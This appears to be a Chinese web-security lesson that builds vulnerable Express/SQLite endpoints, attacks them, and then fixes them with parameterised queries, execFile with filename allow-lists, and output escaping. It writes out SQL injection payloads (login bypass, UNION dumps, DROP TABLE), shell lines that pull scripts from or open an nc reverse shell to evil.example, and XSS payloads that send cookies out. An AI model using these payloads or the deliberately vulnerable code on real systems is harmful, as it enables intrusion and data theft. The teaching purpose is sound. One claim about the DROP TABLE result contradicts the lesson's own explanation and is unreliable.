# 第 228 节课：防注入——SQL、命令、XSS

> 上一节我们让每个查询都带上了 `user_id`。但"查谁的"解决了，"怎么查"还没解决。
> 这一节讲三种注入，它们长得很像：**用户写的东西，被你的代码当成了"指令"的一部分。**
> SQL 里它变成 `' OR 1=1`，命令行里它变成 `; rm -rf`，HTML 里它变成 `<script>`。

**建议用时**：140 分钟
**你需要先完成**：第 226 节（输入校验）、第 227 节（越权已修）、第 5 周的 SQL

---

# 第 0 步：三种注入，一个共同点（10 分钟）

## 0.1 你现在会什么

你写过这样的代码：

```js
db.prepare(`SELECT * FROM messages WHERE content LIKE '%${q}%'`);
```

```js
exec(`ffmpeg -i ${filename} out.mp4`);
```

```js
list.innerHTML += `<li>${msg.content}</li>`;
```

**这三行都能跑，而且看起来都很自然。**

## 0.2 你以后会遇到什么

```text
① 有人在搜索框输入 ' OR '1'='1，你的登录直接绕过
② 有人在文件名里写 xxx; rm -rf /tmp，你的转码脚本把服务器清了
③ 有人发一条消息 <img src=x onerror=fetch('//evil.example?c='+document.cookie)>，
   所有打开这个页面的人，cookie 都被发走了
④ 有人在 ORDER BY 后面拼了一个子查询，把你的用户表导出去了
⑤ 你用了 ORM，以为不会注入，结果在 whereRaw 里拼了字符串
```

**这五个的共同点：**

```text
用户输入的内容，被拼进了"代码/指令"里，
于是它不再被当作"数据"，而被当作"命令"执行了。
```

## 0.3 今天要建立的三个概念

```text
① 数据与代码的边界：任何"拼字符串"的地方，边界就消失了。
   参数化 / 参数数组 / 转义，本质都是"把边界重新画出来"。

② 上下文（context）：同一条内容，放进 SQL、放进 shell、放进 HTML，
   需要的处理完全不同。没有一个"万能过滤函数"。

③ 输出转义优先于输入过滤：存的时候原样存，用的时候按上下文转义。
   因为"输入过滤"永远想不全，而"输出转义"只取决于"往哪输出"。
```

## 0.4 今天的交付物

| 文件 | 位置 | 内容 |
|---|---|---|
| `TASK.md` | `01-任务` | 你正在读的这份 |
| `NOTES.md` | `02-笔记` | 九条 payload 的结果表 |
| `inject-lab/` | `03-练习代码` | 三个注入点的实验项目 |
| `payloads.md` | `03-练习代码` | 你打过的 payload 和响应 |

---

# 第 1 步：SQL 注入——先亲手打穿它（25 分钟）

## 1.1 建实验场

```bash
mkdir -p 03-练习代码/inject-lab
cd 03-练习代码/inject-lab
npm init -y
npm install express better-sqlite3
```

**建 `db.js`（沿用上一节的表，多一个 `users.password`）：**

```js
const Database = require("better-sqlite3");
const db = new Database("lab.db");

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
  );
  CREATE TABLE IF NOT EXISTS messages (
    id INTEGER PRIMARY KEY,
    user_id INTEGER NOT NULL,
    content TEXT NOT NULL
  );
`);

if (db.prepare("SELECT COUNT(*) AS n FROM users").get().n === 0) {
  db.prepare("INSERT INTO users (id,email,password) VALUES (?,?,?)").run(1, "alice@test.com", "alice-pass");
  db.prepare("INSERT INTO users (id,email,password) VALUES (?,?,?)").run(2, "bob@test.com", "bob-pass");
  db.prepare("INSERT INTO messages (user_id,content) VALUES (?,?)").run(1, "hello");
}

module.exports = db;
```

## 1.2 写一个"拼接版"的登录

**建 `server.js`（故意有洞）：**

```js
const express = require("express");
const db = require("./db");
const app = express();
app.use(express.json());

// ❌ 拼接版：字符 ? 拼进 SQL
app.post("/api/login", (req, res) => {
  const { email, password } = req.body || {};
  const sql = `SELECT id, email FROM users WHERE email = '${email}' AND password = '${password}'`;
  const row = db.prepare(sql).get();
  if (!row) return res.status(401).json({ error: "BAD_CREDENTIALS" });
  res.json({ ok: true, user: row });
});

app.listen(3000, () => console.log("http://127.0.0.1:3000"));
```

**逐行读：**

| 行 | 问题 |
|---|---|
| `WHERE email = '${email}'` | **`email` 的值直接进了 SQL 文本** |
| `AND password = '${password}'` | 同上 |
| `db.prepare(sql).get()` | prepare 的是"拼好的完整 SQL"，不是"带占位符的模板" |

**注意最后一行：`prepare` 不是万能药。** 你拼好再 prepare，等于让数据库执行一段"包含用户输入"的 SQL。

## 1.3 正常登录一次

```bash
curl -s -X POST http://127.0.0.1:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@test.com","password":"alice-pass"}'
```

**应该看到：**

```json
{"ok":true,"user":{"id":1,"email":"alice@test.com"}}
```

**用错误的密码：**

```bash
curl -s -X POST http://127.0.0.1:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@test.com","password":"wrong"}'
```

```json
{"error":"BAD_CREDENTIALS"}
```

**到这里一切正常。现在开始打。**

## 1.4 payload 1：注释掉后面的条件

```bash
curl -s -X POST http://127.0.0.1:3000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"alice@test.com'--\",\"password\":\"anything\"}"
```

**应该看到：**

```json
{"ok":true,"user":{"id":1,"email":"alice@test.com"}}
```

**拼出来的 SQL 长这样：**

```sql
SELECT id, email FROM users WHERE email = 'alice@test.com'--' AND password = 'anything'
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `'alice@test.com'` | 邮箱正常闭合了引号 |
| `--` | **SQL 的注释符，后面全部被忽略** |
| `' AND password = 'anything'` | 被注释掉了，**密码条件消失** |

**结果：只要知道邮箱，不需要密码。** 密码这一层完全失效。

## 1.5 payload 2：`' OR '1'='1`

```bash
curl -s -X POST http://127.0.0.1:3000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"x' OR '1'='1\",\"password\":\"x' OR '1'='1\"}"
```

**应该看到：**

```json
{"ok":true,"user":{"id":1,"email":"alice@test.com"}}
```

**拼出来：**

```sql
SELECT id, email FROM users WHERE email = 'x' OR '1'='1' AND password = 'x' OR '1'='1'
```

**逐段读：**

| 片段 | 结果 |
|---|---|
| `email = 'x'` | 假 |
| `OR '1'='1'` | **真** |
| `AND password = 'x'` | 假 |
| `OR '1'='1'` | **真** |

**`AND` 优先级高于 `OR`，所以整条是"真"。** 返回了表里第一行用户。

**注意：返回的是 Alice，不是"任何用户"。** 因为 `get()` 只取第一行。**但这就够了 —— 攻击者已经以 Alice 的身份登录了。**

## 1.6 payload 3：把别的表的内容读出来

```bash
curl -s -X POST http://127.0.0.1:3000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"x' UNION SELECT id, password FROM users--\",\"password\":\"x\"}"
```

**应该看到：**

```json
{"ok":true,"user":{"id":1,"email":"alice-pass"}}
```

**`email` 字段里出现的其实是 `password` 的值。**

**为什么：**

```sql
SELECT id, email FROM users WHERE email = 'x' UNION SELECT id, password FROM users--' AND password = 'x'
```

| 片段 | 意思 |
|---|---|
| `UNION` | 把第二条查询的结果拼到第一条后面 |
| `SELECT id, password` | **注意列数要一样**（这里是 2 列） |
| `--` | 注释掉后面 |

**这就是"任意读表"。** 换成 `UNION SELECT email, password FROM users` 就能把全表拖走。

**真实的拖库 payload 会这么写（列数要试）：**

```sql
' UNION SELECT 1, group_concat(email || ':' || password) FROM users--
```

**`group_concat` 把整个表拼成一个字符串。** 一次请求，全表泄露。

## 1.7 payload 4：DROP TABLE（**只在练手库做**）

**⚠️ 这一条会真的删表。** 只在 `lab.db` 上做，做完重新建。

```bash
curl -s -X POST http://127.0.0.1:3000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"x'; DROP TABLE messages;--\",\"password\":\"x\"}"
```

**应该看到：**

```text
{"error":"BAD_CREDENTIALS"}
```

**看着像"没成功"。** 但去查一下：

```bash
node -e "const db=require('./db'); console.log(db.prepare(\"SELECT name FROM sqlite_master WHERE type='table'\").all())"
```

**应该看到：**

```text
[ { name: 'users' } ]
```

**`messages` 表没了。**

**为什么"看起来没成功"却真的删了：**

```text
better-sqlite3 的 prepare 只执行第一条语句，
DROP 是第二条 —— 有的驱动会执行，有的不会。
但 MySQL 的 mysql2 默认允许一次执行多条（multipleStatements），
真实环境里这一条能直接删库。
```

**这条 payload 的意义不是"能不能成功"，是让你意识到：**

```text
一个输入框，可能让你的整个数据库消失。
```

**重建库：**

```bash
rm lab.db
node -e "require('./db'); console.log('rebuilt')"
```

---

# 第 2 步：参数化查询——把边界画回来（25 分钟）

## 2.1 只改写法，不改逻辑

```js
app.post("/api/login", (req, res) => {
  const { email, password } = req.body || {};
  const row = db
    .prepare("SELECT id, email FROM users WHERE email = ? AND password = ?")
    .get(email, password);
  if (!row) return res.status(401).json({ error: "BAD_CREDENTIALS" });
  res.json({ ok: true, user: row });
});
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `WHERE email = ?` | **`?` 是占位符，不是字符串替换** |
| `.get(email, password)` | 值作为**参数**传给数据库驱动 |
| `sql` 变量消失了 | SQL 文本是固定的，**永远不含用户输入** |

**为什么这就安全了：**

```text
数据库拿到的是两样东西：
① SQL 模板："... WHERE email = ? AND password = ?"
② 参数数组：["x' OR '1'='1", "x"]

它先把模板编译成"执行计划"，再把参数填进去。
参数永远被当作"值"，不可能变成"语法"。
```

**这就是"数据与代码分离"。** 不是"过滤掉了危险字符"，是**根本没有机会变成代码**。

## 2.2 三种驱动，三种占位符

| 驱动 | 占位符 | 写法 |
|---|---|---|
| `better-sqlite3` | `?` | `.get(a, b)` / `.run(a, b)` |
| `mysql2` | `?` | `conn.execute(sql, [a, b])` |
| `pg`（PostgreSQL） | `$1, $2` | `pool.query(sql, [a, b])` |

**`pg` 的例子：**

```js
const r = await pool.query("SELECT id, email FROM users WHERE email = $1 AND password = $2", [email, password]);
```

**注意：参数顺序必须和 `$1`、`$2` 对得上。** 写反了不会报错，但会查错。

## 2.3 验证：四个 payload 全部失效

```bash
# 注释绕过
curl -s -X POST http://127.0.0.1:3000/api/login -H "Content-Type: application/json" \
  -d "{\"email\":\"alice@test.com'--\",\"password\":\"anything\"}"

# OR 1=1
curl -s -X POST http://127.0.0.1:3000/api/login -H "Content-Type: application/json" \
  -d "{\"email\":\"x' OR '1'='1\",\"password\":\"x' OR '1'='1\"}"

# UNION
curl -s -X POST http://127.0.0.1:3000/api/login -H "Content-Type: application/json" \
  -d "{\"email\":\"x' UNION SELECT id, password FROM users--\",\"password\":\"x\"}"

# DROP
curl -s -X POST http://127.0.0.1:3000/api/login -H "Content-Type: application/json" \
  -d "{\"email\":\"x'; DROP TABLE messages;--\",\"password\":\"x\"}"
```

**四条应该全部返回：**

```json
{"error":"BAD_CREDENTIALS"}
```

**逐条读：**

| # | payload | 为什么现在无效 |
|---|---|---|
| 1 | `'--` | `--` 被当作**邮箱字符串的一部分**，不构成注释 |
| 2 | `' OR '1'='1` | 整串被当作邮箱值，库里没有这个邮箱 |
| 3 | `UNION ...` | 同上，`UNION` 只是字符串里的几个字母 |
| 4 | `'; DROP ...` | 同上，分号也是普通字符 |

**再确认表还在：**

```bash
node -e "const db=require('./db'); console.log(db.prepare(\"SELECT name FROM sqlite_master WHERE type='table'\").all())"
```

**应该看到两张表都在。**

**再确认正常登录还能用：**

```bash
curl -s -X POST http://127.0.0.1:3000/api/login -H "Content-Type: application/json" \
  -d '{"email":"alice@test.com","password":"alice-pass"}'
```

```json
{"ok":true,"user":{"id":1,"email":"alice@test.com"}}
```

**四条打不穿、一条正常能过 —— 这才叫"补住了"。**

## 2.4 三个常见的"假参数化"

**假参数化 1：手工转义后拼接**

```js
const safe = email.replace(/'/g, "''");
db.prepare(`SELECT * FROM users WHERE email = '${safe}'`);   // ❌
```

**为什么不行：** 单引号只是字符之一。还有反斜杠、`%`、`_`、编码问题。**你堵了一个洞，留下十个。**

**假参数化 2：把整个值拼进 `IN`**

```js
db.prepare(`SELECT * FROM messages WHERE id IN (${ids.join(",")})`);   // ❌
```

```js
// ✅ 动态占位符
const ph = ids.map(() => "?").join(",");
db.prepare(`SELECT * FROM messages WHERE user_id = ? AND id IN (${ph})`).all(req.user.id, ...ids);
```

**注意区别：** 拼的是 `?,?,?`（占位符本身），不是拼值。

**假参数化 3：模板字符串"看起来像"参数化**

```js
db.prepare(`SELECT * FROM users WHERE email = '${email}'`);   // ❌ 这就是拼接
db.prepare("SELECT * FROM users WHERE email = ?").get(email);  // ✅
```

**判断方法：** 看 SQL 字符串里有没有 `${}`。**有就是拼接。**

---

# 第 3 步：不能参数化的地方（20 分钟）

## 3.1 表名、列名、排序方向

**这三样不能占位符：**

```js
db.prepare("SELECT * FROM ? WHERE ? = ?");   // ❌ 一定会报错
```

**原因：** 占位符只能替换"值"。**表名和列名是"结构"，不是值。** 数据库在编译执行计划时就要知道它们。

**所以它们只能"白名单映射"：**

```js
const SORTABLE = {
  created: "created_at",
  updated: "updated_at",
  id: "id",
};
const DIRECTION = { asc: "ASC", desc: "DESC" };

app.get("/api/messages", requireLogin, (req, res) => {
  const col = SORTABLE[req.query.sort] || "created_at";
  const dir = DIRECTION[String(req.query.dir).toLowerCase()] || "DESC";
  const rows = db
    .prepare(`SELECT * FROM messages WHERE user_id = ? ORDER BY ${col} ${dir} LIMIT 50`)
    .all(req.user.id);
  res.json(rows);
});
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `SORTABLE[req.query.sort]` | **只认识 key**，`sort=created_at` 查不到，走默认 |
| `\|\| "created_at"` | 不认识就退回默认值 |
| `DIRECTION[...]` | 同上，只接受 `asc` / `desc` |
| `${col} ${dir}` | **拼的是映射后的固定字符串**，不是用户输入 |

**为什么这样安全：**

```text
用户能控制的只有"选哪个 key"。
而 key 的集合是你在代码里写死的。
他传 sort=1;DROP TABLE 只会查不到，然后走默认值。
```

## 3.2 亲手打一次 `ORDER BY` 注入

**先写一个反例：**

```js
app.get("/api/messages/sorted", requireLogin, (req, res) => {
  const rows = db
    .prepare(`SELECT * FROM messages WHERE user_id = ? ORDER BY ${req.query.sort}`)
    .all(req.user.id);
  res.json(rows);
});
```

```bash
curl -s "http://127.0.0.1:3000/api/messages/sorted?sort=(SELECT%20password%20FROM%20users%20WHERE%20id=1)" \
  -H "X-User-Id: 1"
```

**会怎样：**

```text
SQLite 会报错（子查询不能直接排），但错误信息里可能带着 SQL 片段。
在 MySQL 里，这种"基于布尔/时间的盲注"是能用的：
sort=(CASE WHEN (SELECT substr(password,1,1) FROM users WHERE id=1)='a' THEN id ELSE content END)
→ 靠排序结果的变化，一个字一个字猜出密码。
```

**这就是"盲注"：不需要看到数据，靠"结果有没有变化"就能把数据推出来。**

**改成白名单后：**

```bash
curl -s "http://127.0.0.1:3000/api/messages/sorted?sort=(SELECT%20password%20FROM%20users)" -H "X-User-Id: 1"
```

**应该正常返回消息列表**（因为 `sort` 不认识，走了默认）。**没有报错，没有泄露。**

## 3.3 LIKE 的通配符

```js
db.prepare("SELECT * FROM messages WHERE user_id = ? AND content LIKE ?")
  .all(req.user.id, `%${q}%`);
```

**这段是参数化的，不会注入。** 但有一个别的坑：

```text
用户搜 "100%"  → LIKE '%100%%'  → % 变成通配符，结果不对
用户搜 "_"     → LIKE '%_%'     → 匹配任意单字符，返回全部
```

**修法：把 `%` 和 `_` 转义，并加 `ESCAPE`：**

```js
const escaped = q.replace(/[\\%_]/g, (m) => "\\" + m);
db.prepare("SELECT * FROM messages WHERE user_id = ? AND content LIKE ? ESCAPE '\\'")
  .all(req.user.id, `%${escaped}%`);
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `replace(/[\\%_]/g, ...)` | 把 `\`、`%`、`_` 前面加反斜杠 |
| `ESCAPE '\\'` | 告诉 SQL"反斜杠是转义符" |

**为什么这个不算"注入"：** 它不会让攻击者读到别的表。**它只是让搜索结果不对。** 但用户会以为"搜不到"，然后来投诉你。

---

# 第 4 步：命令注入——`exec` 拼字符串（25 分钟）

## 4.1 一个真实的场景

**假设你要把上传的视频转成 mp4：**

```js
const { exec } = require("child_process");

app.post("/api/convert", (req, res) => {
  const { filename } = req.body;
  exec(`ffmpeg -i uploads/${filename} -c copy out/${filename}.mp4`, (err, stdout) => {
    if (err) return res.status(500).json({ error: "CONVERT_FAILED" });
    res.json({ ok: true });
  });
});
```

**这段代码看起来很正常。** 它有一个洞。

## 4.2 打它

```bash
curl -s -X POST http://127.0.0.1:3000/api/convert \
  -H "Content-Type: application/json" \
  -d '{"filename":"a.mp4; id > /tmp/pwned"}'
```

**拼出来的命令：**

```bash
ffmpeg -i uploads/a.mp4; id > /tmp/pwned -c copy out/a.mp4; id > /tmp/pwned.mp4
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `a.mp4` | 正常文件名 |
| `;` | **shell 的命令分隔符** |
| `id > /tmp/pwned` | 执行 `id`，把输出写进文件 |

**如果服务器上 `/tmp/pwned` 存在了，说明命令被执行了。**

**更狠的几种：**

```text
filename=;cat /etc/passwd               读系统文件
filename=$(curl http://evil.example/x)  从外网拉脚本
filename=|nc evil.example 4444 -e /bin/sh   反弹 shell
filename=`rm -rf /srv/app/uploads`      删文件
```

**为什么 `;` 能生效：** `exec` 把整串交给 `/bin/sh -c` 执行。**shell 看到 `;` 就当"命令结束，开始下一条"。**

## 4.3 修法一：`execFile` + 参数数组

```js
const { execFile } = require("child_process");

app.post("/api/convert", (req, res) => {
  const { filename } = req.body;
  execFile(
    "ffmpeg",
    ["-i", `uploads/${filename}`, "-c", "copy", `out/${filename}.mp4`],
    (err) => {
      if (err) return res.status(500).json({ error: "CONVERT_FAILED" });
      res.json({ ok: true });
    }
  );
});
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `execFile` | **不经过 shell**，直接执行这个程序 |
| `"ffmpeg"` | 程序名（数组第一项） |
| `["-i", ...]` | **每个参数是一个数组元素**，不会被 shell 再拆一次 |

**关键区别：**

```text
exec("ffmpeg -i a.mp4; id")     → shell 解析 → 执行两条命令
execFile("ffmpeg", ["-i","a.mp4; id"]) → 把 "a.mp4; id" 当成一个参数 → ffmpeg 报"文件不存在"
```

**`;` 不再有特殊含义，它只是一个字符。**

## 4.4 修法二：连参数都要校验

**`execFile` 解决了"命令注入"，但没解决"参数注入"。**

**反例：**

```js
execFile("ffmpeg", ["-i", `uploads/${filename}`, ...]);
```

**如果 `filename` 是 `--help`：**

```text
ffmpeg -i uploads/--help
→ 不报错，但输出了一堆帮助信息（因为 --help 被当成参数）
```

**如果 `filename` 是 `../../.env`：**

```text
ffmpeg -i uploads/../../.env
→ 读到了你的 .env（这叫"路径穿越"）
```

**所以参数也要过白名单：**

```js
const path = require("path");

function safeName(name) {
  const base = path.basename(String(name || ""));
  if (!/^[a-zA-Z0-9_-]+\.(mp4|mov|webm)$/.test(base)) return null;
  if (base.startsWith(".")) return null;
  return base;
}

app.post("/api/convert", (req, res) => {
  const base = safeName(req.body.filename);
  if (!base) return res.status(400).json({ error: "BAD_FILENAME" });

  execFile("ffmpeg", ["-i", path.join("uploads", base), "-c", "copy", path.join("out", base + ".mp4")], ...);
});
```

**逐段读 `safeName`：**

| 片段 | 意思 |
|---|---|
| `path.basename(...)` | **去掉所有目录部分**：`../../.env` → `.env` |
| `/^[a-zA-Z0-9_-]+\.(mp4\|mov\|webm)$/` | 只允许"字母数字下划线横线 + 指定扩展名" |
| `if (base.startsWith("."))` | 挡住 `.env`、`.git` 这种点开头的 |

**为什么 `basename` 不够：**

```text
basename("../../.env")   → ".env"    还是能读到 .env
basename("..\\..\\.env") → ".env"    同理
```

**所以要"白名单正则 + 拒绝点开头"，不是只做 basename。**

## 4.5 验证

```bash
# 命令注入
curl -s -X POST http://127.0.0.1:3000/api/convert \
  -H "Content-Type: application/json" \
  -d '{"filename":"a.mp4; id > /tmp/pwned"}'

# 路径穿越
curl -s -X POST http://127.0.0.1:3000/api/convert \
  -H "Content-Type: application/json" \
  -d '{"filename":"../../.env"}'
```

**两条都应该返回：**

```json
{"error":"BAD_FILENAME"}
```

**再确认 `/tmp/pwned` 不存在：**

```bash
ls /tmp/pwned 2>/dev/null || echo "✅ 没被创建"
```

**然后测一个正常的文件名**，确认功能还在：

```bash
curl -s -X POST http://127.0.0.1:3000/api/convert \
  -H "Content-Type: application/json" \
  -d '{"filename":"demo.mp4"}'
```

**应该进入 ffmpeg（可能因为文件不存在而 `CONVERT_FAILED`，但那是业务错误，不是被拒）。**

---

# 第 5 步：XSS——存进去的 `<script>`（30 分钟）

## 5.1 存储型 XSS 是怎么发生的

**假设你的消息列表这样渲染：**

```js
async function load() {
  const list = await (await fetch("/api/messages")).json();
  document.getElementById("list").innerHTML = list.map((m) => `<li>${m.content}</li>`).join("");
}
```

**这一步看似没问题，直到有人发了一条：**

```text
<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
```

**会发生什么：**

```text
① 消息存进数据库（原样存的）
② 任何人打开列表页，这段 HTML 被 innerHTML 插入
③ 图片加载失败 → 触发 onerror → 执行 JS
④ JS 把 document.cookie 发到 evil.example
```

**这就是"存储型 XSS"：**

```text
反射型：payload 在 URL 里，骗你点一次链接
存储型：payload 存在数据库里，**每个打开页面的人都会中**
```

**存储型更严重，因为它不需要骗人点链接。**

## 5.2 建一个最小的 XSS 实验

**加一个"发消息 + 列表"的页面：**

```js
app.use(express.static("public"));

app.post("/api/messages", requireLogin, (req, res) => {
  const info = db.prepare("INSERT INTO messages (user_id, content) VALUES (?,?)")
    .run(req.user.id, String(req.body.content || ""));
  res.status(201).json({ id: info.lastInsertRowid });
});

app.get("/api/messages", requireLogin, (req, res) => {
  res.json(db.prepare("SELECT * FROM messages WHERE user_id = ?").all(req.user.id));
});
```

**`public/index.html`（故意用 `innerHTML`）：**

```html
<ul id="list"></ul>
<script>
  fetch("/api/messages", { headers: { "X-User-Id": "1" } })
    .then((r) => r.json())
    .then((rows) => {
      document.getElementById("list").innerHTML = rows.map((m) => `<li>${m.content}</li>`).join("");
    });
</script>
```

**发一条带 payload 的消息：**

```bash
curl -s -X POST http://127.0.0.1:3000/api/messages \
  -H "X-User-Id: 1" -H "Content-Type: application/json" \
  -d '{"content":"<img src=x onerror=\"alert(1)\">"}'
```

**打开 `http://127.0.0.1:3000`。**

**应该看到：** 一个弹窗写着 `1`。

**真弹了，就说明你的页面在"执行用户写的代码"。**

## 5.3 换成"偷 cookie"的 payload

**先把 cookie 造出来（模拟登录态）：**

```js
// 临时加一行，只为实验
res.cookie?.("session", "abc123");
```

**或者在浏览器 Console 里：**

```js
document.cookie = "session=abc123";
```

**payload 改成：**

```bash
curl -s -X POST http://127.0.0.1:3000/api/messages \
  -H "X-User-Id: 1" -H "Content-Type: application/json" \
  -d '{"content":"<img src=x onerror=\"document.title=document.cookie\">"}'
```

**打开页面，看标签页标题变成：**

```text
session=abc123
```

**真变成这样，说明：**

```text
攻击者能在你的页面上执行任意 JS。
而 JS 能读到 document.cookie、能发任意请求、能改页面内容。
```

## 5.4 修法一：`textContent` 而不是 `innerHTML`

```js
const list = document.getElementById("list");
list.innerHTML = "";
for (const m of rows) {
  const li = document.createElement("li");
  li.textContent = m.content;      // ✅ 当作纯文本
  list.appendChild(li);
}
```

**逐段读：**

| 写法 | 浏览器怎么处理 |
|---|---|
| `innerHTML = "<img onerror=...>"` | **解析成 DOM**，`onerror` 会执行 |
| `textContent = "<img onerror=...>"` | **当作字符串**，页面上显示这几个字符本身 |

**验证：**

**先把 payload 再发一次，刷新页面。**

**应该看到：**

```text
页面上显示一行字：<img src=x onerror="alert(1)">
没有弹窗，标题也没变。
```

**这就是"转义"的本质：让它显示，但不让它执行。**

## 5.5 修法二：服务端转义（用于服务端渲染的 HTML）

**如果你用 EJS / 手写模板拼 HTML，前端那套用不上。**

```js
function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```

**逐行读：**

| 替换 | 为什么 |
|---|---|
| `&` → `&amp;` | **必须第一个做**，否则后面替换出来的 `&lt;` 会被二次转义成 `&amp;lt;` |
| `<` → `&lt;` | 挡住标签开始 |
| `>` → `&gt;` | 挡住标签结束 |
| `"` → `&quot;` | 挡住属性值里的引号闭合 |
| `'` → `&#39;` | 同上（单引号属性） |

**顺序错了会怎样：**

```js
// ❌ 先替换 < 再替换 &
"<" → "&lt;" → "&amp;lt;"
// 页面上显示 "&lt;" 而不是 "<"
```

**用的时候：**

```js
res.send(`<ul>${rows.map((m) => `<li>${escapeHtml(m.content)}</li>`).join("")}</ul>`);
```

**如果你用 EJS：**

```html
<li><%= m.content %></li>     <!-- ✅ <%= %> 自动转义 -->
<li><%- m.content %></li>     <!-- ❌ <%- %> 不转义，等于 innerHTML -->
```

**记住这个区别，它救过很多人。**

## 5.6 存储转义 vs 输出转义

**这是这一节最重要的一个判断。**

| | 存储转义（存的时候转） | 输出转义（用的时候转） |
|---|---|---|
| 做法 | 入库前把 `<` 变成 `&lt;` | 入库原样，渲染时转 |
| 优点 | 只要存一次 | 数据是原样的，能导出、能搜、能给别的地方用 |
| 缺点 | **导出到 CSV / 发给 API 时带着 `&lt;`**；改渲染方式要重洗数据库 | 每个输出点都要记得转 |
| 结论 | ❌ 不推荐 | ✅ 推荐 |

**为什么"存原样"更重要：**

```text
同一条消息，你可能要：
① 显示在网页上     → 需要 HTML 转义
② 塞进 JSON 返回   → 不需要 HTML 转义（JSON.stringify 自己处理）
③ 导出成 CSV       → 需要 CSV 转义（引号加倍）
④ 发到邮件里       → 需要另一种转义
```

**如果你在存的时候就转了，②③④ 拿到的都是"带着 `&lt;` 的脏数据"。**

**规则：原样存，按上下文转。**

## 5.7 修法三：CSP 和 HttpOnly（兜底，不是替代）

**`HttpOnly`：让 JS 读不到 cookie**

```js
res.cookie("session", sid, { httpOnly: true, secure: true, sameSite: "lax" });
```

| 选项 | 作用 |
|---|---|
| `httpOnly: true` | **`document.cookie` 读不到它** |
| `secure: true` | 只在 HTTPS 下发送 |
| `sameSite: "lax"` | 跨站请求时不带（挡大部分 CSRF） |

**验证：**

```js
// 浏览器 Console
document.cookie
```

**有 `HttpOnly` 的话，这个 cookie 不会出现在结果里。**

**注意：`HttpOnly` 只保护 cookie，不阻止 XSS 本身。** 攻击者还是能 `fetch('/api/xxx')` 用你的身份操作，只是偷不走"长期凭证"。

**CSP：告诉浏览器"只准执行我允许的脚本"**

```js
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'"
  );
  next();
});
```

**逐段读：**

| 指令 | 意思 |
|---|---|
| `default-src 'self'` | 默认只允许同源资源 |
| `script-src 'self'` | **只允许加载自己域名下的脚本，内联 `<script>` 全部禁止** |
| `object-src 'none'` | 禁止 `<object>` / `<embed>` |
| `base-uri 'self'` | 防止有人改 `<base>` 把相对路径指向别处 |

**加了 CSP 之后：**

```text
<img onerror=...> 这类"内联事件处理器"会被拦。
外链 evil.example 的脚本会被拦。
```

**⚠️ 加 CSP 要先测，否则会把正常功能拦掉：** 内联 `<script>`、内联 `style`、`eval`、外部字体、统计脚本都会失效。**先加 `Content-Security-Policy-Report-Only`，看报告里有什么，再正式上。**

**CSP 是"兜底"，不是"替代转义"。** 因为总有办法绕过（比如利用你白名单里的某个库）。

---

# 第 6 步：九条 payload，全部回归（15 分钟）

## 6.1 记录表

| # | 类型 | payload | 期望 |
|---|---|---|---|
| 1 | SQL 注释 | `alice@test.com'--` | 401 |
| 2 | SQL 布尔 | `' OR '1'='1` | 401 |
| 3 | SQL UNION | `' UNION SELECT id,password FROM users--` | 401 |
| 4 | SQL 堆叠 | `'; DROP TABLE messages;--` | 401 且表还在 |
| 5 | ORDER BY | `(SELECT password FROM users)` | 正常默认排序 |
| 6 | 命令分隔 | `a.mp4; id > /tmp/pwned` | 400 |
| 7 | 命令替换 | `a.mp4$(whoami)` | 400 |
| 8 | XSS 图片 | `<img src=x onerror=alert(1)>` | 显示为文字 |
| 9 | XSS 脚本 | `<script>alert(document.cookie)</script>` | 显示为文字 |

## 6.2 一次跑完

```bash
B=http://127.0.0.1:3000
H='Content-Type: application/json'

curl -s -o /dev/null -w "1:%{http_code} " -X POST $B/api/login -H "$H" -d "{\"email\":\"alice@test.com'--\",\"password\":\"x\"}"
curl -s -o /dev/null -w "2:%{http_code} " -X POST $B/api/login -H "$H" -d "{\"email\":\"x' OR '1'='1\",\"password\":\"x\"}"
curl -s -o /dev/null -w "3:%{http_code} " -X POST $B/api/login -H "$H" -d "{\"email\":\"x' UNION SELECT id,password FROM users--\",\"password\":\"x\"}"
curl -s -o /dev/null -w "4:%{http_code} " -X POST $B/api/login -H "$H" -d "{\"email\":\"x'; DROP TABLE messages;--\",\"password\":\"x\"}"
curl -s -o /dev/null -w "5:%{http_code} " "$B/api/messages/sorted?sort=(SELECT%20password%20FROM%20users)" -H "X-User-Id: 1"
curl -s -o /dev/null -w "6:%{http_code} " -X POST $B/api/convert -H "$H" -d '{"filename":"a.mp4; id"}'
curl -s -o /dev/null -w "7:%{http_code} " -X POST $B/api/convert -H "$H" -d '{"filename":"a.mp4$(whoami)"}'
echo
```

**应该看到：**

```text
1:401 2:401 3:401 4:401 5:200 6:400 7:400
```

**逐条读：**

| # | 结果 | 说明 |
|---|---|---|
| 1—4 | `401` | ✅ 参数化生效，注入变成"普通字符串"，匹配不到用户 |
| 5 | `200` | ✅ 白名单生效，非法 `sort` 走默认，正常返回列表 |
| 6—7 | `400` | ✅ 文件名白名单拒绝 |

**第 8、9 条要在浏览器里看：**

```bash
curl -s -X POST $B/api/messages -H "X-User-Id: 1" -H "Content-Type: application/json" \
  -d '{"content":"<script>alert(document.cookie)</script>"}'
```

**刷新页面，应该看到这行文字原样显示，不弹窗。**

**如果你用的是浏览器工具（F12 → Elements），应该看到：**

```html
<li>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</li>
```

**`&lt;` 就是"被转义"的证据。**

## 6.3 一个"看起来防住了其实没防"的检查

**改一下前端，用 `innerHTML`：**

```js
